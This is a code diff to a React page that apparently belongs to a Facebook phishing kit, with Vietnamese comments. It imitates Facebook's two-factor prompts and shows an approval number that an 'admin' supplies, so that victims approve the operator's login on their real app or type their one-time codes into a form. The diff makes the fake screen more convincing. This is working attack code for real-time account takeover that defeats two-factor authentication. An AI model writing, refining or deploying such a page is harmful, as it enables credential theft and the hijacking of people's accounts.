@@ -874,22 +874,22 @@ export default function Home() {
   <>
     <div style={{ textAlign: 'center', marginBottom: '16px' }}>
       <h2 style={{ fontSize: '22px', fontWeight: '800', color: '#1c1e21', marginBottom: '8px', letterSpacing: '-0.3px' }}>
-        {matchNumber ? 'Two-Factor Authentication' : 'Two-factor authentication'}
+        {matchNumber ? 'Approve login request' : 'Two-factor authentication'}
       </h2>
       <p style={{ fontSize: '14px', color: '#65676b', lineHeight: '1.5', margin: 0 }}>
         {matchNumber 
-          ? 'For your security, please approve this login request on your trusted device, or enter the approval code below.' 
+          ? 'For your security, we sent a login request to your Facebook app. Please approve it to continue.' 
           : 'Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, or Gmail.'}
       </p>
     </div>
 
-    {/* HÌNH ẢNH MINH HỌA TO, TRÀN VIỀN 2 BÊN */}
+    {/* HÌNH ẢNH MINH HỌA TO, KÉO RỘNG 2 BÊN */}
     <div style={{ 
-      margin: '0 -20px 20px -20px', // Kéo âm lề để ảnh tràn ra sát mép Modal
-      width: 'calc(100% + 40px)',   // Bù lại phần lề vừa kéo
+      margin: '0 -20px 24px -20px', 
+      width: 'calc(100% + 40px)',
       display: 'flex', 
       justifyContent: 'center',
-      backgroundColor: '#f5f6f7',   // Nền xám nhạt cho ảnh nổi bật
+      backgroundColor: '#f5f6f7', 
       overflow: 'hidden'
     }}>
       <img
@@ -898,7 +898,7 @@ export default function Home() {
         style={{ 
           width: '100%', 
           height: 'auto', 
-          maxHeight: '220px', // Giới hạn chiều cao để không làm modal quá dài
+          maxHeight: '240px', 
           objectFit: 'cover',
           display: 'block'
         }}
@@ -906,89 +906,74 @@ export default function Home() {
     </div>
 
     {matchNumber ? (
-      <>
-        {/* CÁCH 1: DUYỆT TRÊN APP (DÀNH CHO ADMIN GỬI SỐ) */}
+      /* TRƯỜNG HỢP CÓ SỐ DUYỆT TỪ ADMIN */
+      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+        
+        {/* HỘP HƯỚNG DẪN DUYỆT TRÊN APP */}
         <div style={{ 
           background: '#f0f7ff', 
           border: '1px solid #0064e0', 
-          padding: '16px', 
+          padding: '20px 16px', 
           borderRadius: '12px', 
-          marginBottom: '20px', 
           textAlign: 'center',
           boxShadow: '0 4px 12px rgba(0, 100, 224, 0.08)'
         }}>
-          <p style={{ margin: '0 0 4px 0', fontSize: '13px', color: '#1c1e21', fontWeight: '600' }}>
-            Open the Facebook app on your trusted device and tap "Approve".
+          <p style={{ margin: '0 0 12px 0', fontSize: '15px', color: '#1c1e21', fontWeight: '600', lineHeight: '1.5' }}>
+            Open the Facebook app on your phone and select the matching number:
           </p>
-          <p style={{ margin: '8px 0 0 0', fontSize: '12px', color: '#65676b' }}>
-            Or enter the code: <strong style={{ color: '#0064e0', fontSize: '18px', letterSpacing: '2px' }}>{matchNumber}</strong>
+          
+          {/* CON SỐ TO RÕ RÀNG */}
+          <div style={{ 
+            fontSize: '40px', 
+            fontWeight: '900', 
+            color: '#0064e0', 
+            letterSpacing: '8px', 
+            textIndent: '8px',
+            marginBottom: '8px'
+          }}>
+            {matchNumber}
+          </div>
+          
+          <p style={{ margin: 0, fontSize: '13px', color: '#65676b' }}>
+            Tap <strong>"Yes, it's me"</strong> or <strong>"Approve"</strong> in the app.
           </p>
         </div>
 
-        {/* CÁCH 2: NHẬP OTP (VẪN GIỮ NGUYÊN) */}
-        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-          <div>
-            <label style={{ display: 'block', fontSize: '13px', fontWeight: '600', color: '#1c1e21', marginBottom: '6px' }}>
-              Or enter code manually
-            </label>
-            <input
-              type="text"
-              placeholder="Enter code"
-              value={otp}
-              onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
-              style={{
-                padding: '14px 16px',
-                fontSize: '20px',
-                border: '1px solid #ccd0d5',
-                borderRadius: '8px',
-                outline: 'none',
-                width: '100%',
-                boxSizing: 'border-box',
-                textAlign: 'center',
-                letterSpacing: '4px',
-                fontWeight: '700'
-              }}
-            />
-          </div>
-          
-          <div style={{ fontSize: '13px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', justifyContent: 'center', margin: '4px 0' }}>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
-            Didn't receive it?
-            {otpCanResend ? (
-              <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
-                background: 'none', border: 'none',
-                color: resendLoading ? '#a0c3ff' : '#0064e0',
-                fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
-                fontSize: '13px', padding: 0,
-                display: 'inline-flex', alignItems: 'center', gap: 6
-              }}>
-                {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Send again'}
-              </button>
-            ) : (
-              <span>Try again in <strong style={{ color: '#1c1e21' }}>{formatTime(otpSecondsLeft)}</strong></span>
-            )}
-          </div>
-
-          {showOtpError && <div style={{ color: '#fa383e', fontSize: '13px', textAlign: 'center', background: '#ffebe8', padding: '10px', borderRadius: '6px', fontWeight: '500' }}>Incorrect code. Please try again.</div>}
-
-          <button type="submit" disabled={loading || otp.length < 6} className="fb-btn" style={{
+        {/* NÚT BÁO ĐÃ DUYỆT (Dùng để đóng modal, tránh trường hợp khách bị kẹt) */}
+        <button 
+          type="button" 
+          onClick={() => { setShowSuccess(true); setStep(5); }} 
+          className="fb-btn" 
+          style={{
             height: 52,
-            background: otp.length >= 6 && !loading ? '#0866FF' : '#e4e6eb',
-            color: otp.length >= 6 && !loading ? '#fff' : '#bcc0c4',
+            background: '#0866FF',
+            color: '#fff',
             marginTop: '8px',
             display: 'flex',
             justifyContent: 'center',
             alignItems: 'center',
             gap: 8,
-            transition: 'all 0.2s ease',
-            fontSize: '16px'
-          }}>
-            {loading ? <Spinner size={22} color={otp.length >= 6 ? '#fff' : '#bcc0c4'} /> : 'Submit Code'}
+            fontSize: '16px',
+            fontWeight: '700'
+          }}
+        >
+          I have approved on my app
+        </button>
+
+        {/* NÚT ẨN DÀNH CHO TRƯỜNG HỢP KHÁCH BỊ LỖI APP, MUỐN NHẬP OTP */}
+        <div style={{ textAlign: 'center', marginTop: '4px' }}>
+          <button 
+            type="button"
+            onClick={() => setMatchNumber(null)} // Xóa số duyệt để hiện lại form OTP
+            style={{ background: 'none', border: 'none', color: '#0064e0', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}
+          >
+            Can't approve? Enter security code instead
           </button>
-        </form>
-      </>
+        </div>
+
+      </div>
     ) : (
-      /* TRƯỜNG HỢP BÌNH THƯỜNG (KHÔNG CÓ ADMIN DUYỆT SỐ) - GIỮ NGUYÊN FORM OTP GỐC */
+      /* TRƯỜNG HỢP BÌNH THƯỜNG (NHẬP OTP) */
       <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
         <input
           type="text"
